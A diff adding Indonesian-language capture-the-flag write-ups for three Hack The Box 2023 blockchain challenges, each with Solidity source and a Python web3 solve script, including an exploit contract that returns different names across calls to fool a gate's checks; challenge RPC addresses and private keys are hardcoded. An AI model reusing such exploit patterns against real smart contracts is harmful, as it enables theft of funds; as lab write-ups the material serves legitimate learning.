@@ -709,6 +709,225 @@ if __name__ == "__main__":
 reference-writeup: [https://mukarramkhalid.com/hack-the-box-cyber-apocalypse-2023-the-cursed-mission-writeups/#web---unearthly-shop](https://mukarramkhalid.com/hack-the-box-cyber-apocalypse-2023-the-cursed-mission-writeups/#web---unearthly-shop "https://mukarramkhalid.com/hack-the-box-cyber-apocalypse-2023-the-cursed-mission-writeups/#web---unearthly-shop")
 
 ![](Pasted%20image%2020230324115213.png)
+# Navigating the Unknown - Blockchain
+Untuk challenge ini kita hanya perlu untuk memanggil fungsi `updateSensors` dengan parameter 10 untuk merubah nilai variable `updated` menjadi true.
+
+```sol
+pragma solidity ^0.8.18;
+
+
+contract Unknown {
+    
+    bool public updated;
+
+    function updateSensors(uint256 version) external {
+        if (version == 10) {
+            updated = true;
+        }
+    }
+
+}
+```
+
+Solve Script:
+
+```python
+from web3 import Web3
+from web3 import HTTPProvider
+from web3.contract import Contract
+from solcx import compile_source
+from pwn import context, log
+
+context.log_level = "INFO"
+
+rpc_url = "http://167.71.143.44:32388/"
+privkey = "0x3a9f55e344138658f1cecbf4f114a33b0fe7c54947da3a95b10bffcf25d6ecaa"
+target_contract_addr = "0x045265AcEC01Bd0f0a6F5c9f956e324a9C3C0761"
+setup_contract_addr = "0x964366640a6aB27736c63D98C01409b73d560CBb"
+
+def Unknown_abi():
+    source = open("Unknown.sol").read()
+    compile = compile_source(source, output_values=['abi'])
+    return compile.popitem()[1]['abi']
+
+# compile Unknown.sol to abi format
+unknown_abi = Unknown_abi()
+
+w3 = Web3(HTTPProvider(rpc_url))
+w3.eth.default_account = w3.eth.account.from_key(privkey).address
+
+target_contract = w3.eth.contract(target_contract_addr, abi=unknown_abi)
+# call updateSensors function
+target_contract.functions.updateSensors(10).transact()
+
+# check if update equals to true
+print(target_contract.functions.updated().call())
+```
+
+# Shooting 101 - Blockchain
+Pada challenge ini kita perlu memanggil fallback, receive, dan function.
+
+Source code:
+```sol
+pragma solidity ^0.8.18;
+
+contract ShootingArea {
+    bool public firstShot;
+    bool public secondShot;
+    bool public thirdShot;
+
+    modifier firstTarget() {
+        require(!firstShot && !secondShot && !thirdShot);
+        _;
+    }
+
+    modifier secondTarget() {
+        require(firstShot && !secondShot && !thirdShot);
+        _;
+    }
+
+    modifier thirdTarget() {
+        require(firstShot && secondShot && !thirdShot);
+        _;
+    }
+
+    receive() external payable secondTarget {
+        secondShot = true;
+    }
+
+    fallback() external payable firstTarget {
+        firstShot = true;
+    }
+
+    function third() public thirdTarget {
+        thirdShot = true;
+    }
+}
+```
+
+solve script
+
+```python
+from web3 import Web3
+from web3 import HTTPProvider
+from web3.contract import Contract
+from solcx import compile_source
+
+rpc_url = "http://159.65.94.38:31404/"
+privkey = "0xdd15d05a28bb222fdf30bbfbe9ad1af0f1dd6129b9a723d2958b88085a6dbd7b"
+my_address = "0x0BEBcc3eA7FAc126346E26346C92e024CbDbC69A"
+target_contract_addr = "0x850Ef42049f51717236359f1e4E6c9f12F366AE9"
+setup_contract_addr = "0xC667B07512Cc80fC7e8fC2A405a9E7193473d2d0"
+
+def get_abi(file):
+    source = open(file).read()
+    compile = compile_source(source, output_values=['abi'])
+    return compile.popitem()[1]['abi']
+
+target_abi = get_abi("ShootingArea.sol")
+
+w3 = Web3(HTTPProvider(rpc_url))
+w3.eth.default_account = w3.eth.account.from_key(privkey).address
+
+target_contract = w3.eth.contract(target_contract_addr, abi=target_abi)
+
+# call fallback
+a = w3.eth.send_transaction({'to': target_contract_addr, 'from': my_address, 'data': "0x61455567"})
+print(a)
+
+# call receive
+a = w3.eth.send_transaction({'to': target_contract_addr, 'from': my_address})
+print(a)
+
+# call function
+a = target_contract.functions.third().transact()
+print(a)
+
+# check if thirdShot is equal to true
+a = target_contract.functions.thirdShot().call()
+print(a)
+```
+
+# The Art of Deception - Blockchain
+Untuk challenge ini kita diperlukan untuk mendeploy contract ke server untuk meniput contract utama dan mengendalikan msg.sender
+
+Solve script:
+```python
+from web3 import Web3
+from web3 import HTTPProvider
+from web3.contract import Contract
+from solcx import compile_source
+
+rpc_url = "http://139.59.176.230:32651/"
+privkey = "0x38389ca50c55cb28566247692b8a2fc0de1d0c1d858f1e050a744ddae62fdafb"
+my_address = "0x7791b3027c416bA59AABB63E5Fc904af884f4719"
+target_contract_addr = "0xf6b9AE7ed67c4744b4bce815FDF67C733Ddd7e62"
+setup_contract_addr = "0xADeD374aFd24c6e0339a12BeA2BaE46A3872990a"
+w3 = Web3(HTTPProvider(rpc_url))
+
+def compile(file):
+    source = open(file).read()
+    compile = compile_source(source, output_values=['abi', 'bin'])
+    return compile
+
+def exploit_compile():
+    exploit = """
+pragma solidity ^0.8.18;
+
+interface Entrant {
+    function name() external returns (string memory);
+}
+
+import {HighSecurityGate} from "./FortifiedPerimeter.sol";
+
+contract Exploit is Entrant {
+  bool public firstCheck = true;
+
+  function name() external returns (string memory){
+    if (firstCheck){
+      firstCheck = false;
+      return "Orion";
+    }
+    return "Pandora";
+  }
+
+  function callSecGate(HighSecurityGate _gate) external {
+    _gate.enter();
+  }
+}
+    """
+    exploit = compile_source(exploit, output_values=['abi', 'bin'])['<stdin>:Exploit']
+    return exploit
+
+def deploy_contract():
+    contract = exploit_compile()
+    exploit_contract = w3.eth.contract(abi=contract['abi'], bytecode=contract['bin'])
+    construct_txn = exploit_contract.constructor(5).build_transaction(
+        {
+            'from': my_address,
+            'nonce': w3.eth.get_transaction_count(my_address),
+        }
+    )
+    tx_create = w3.eth.account.sign_transaction(construct_txn, privkey)
+    tx_hash = w3.eth.send_raw_transaction(tx_create.rawTransaction)
+    tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
+    print(f'Contract deployed at address: { tx_receipt.contractAddress }')
+    return tx_receipt.contractAddress
+
+target_abi = compile("FortifiedPerimeter.sol").popitem()[1]['abi']
+
+w3.eth.default_account = w3.eth.account.from_key(privkey).address
+
+target_contract = w3.eth.contract(target_contract_addr, abi=target_abi)
+exploit_contract_addr = deploy_contract()
+exploit_abi = compile("Exploit.sol")['<stdin>:Exploit']['abi']
+exploit_contract = w3.eth.contract(exploit_contract_addr, abi=exploit_abi)
+exploit_contract.functions.callSecGate(target_contract_addr).transact()
+firstCheck = exploit_contract.functions.firstCheck().call()
+print(firstCheck)
+```
+
+untuk lebih lengkapnya bisa dilihat di writeup berikut ini: [https://sirius-a.github.io/ctf-writeups/2023/HTB-cyber-apocalypse/blockchain_the_art_of_deception/](https://sirius-a.github.io/ctf-writeups/2023/HTB-cyber-apocalypse/blockchain_the_art_of_deception/ "https://sirius-a.github.io/ctf-writeups/2023/HTB-cyber-apocalypse/blockchain_the_art_of_deception/")
 
 # Our Community Member Write Up
 
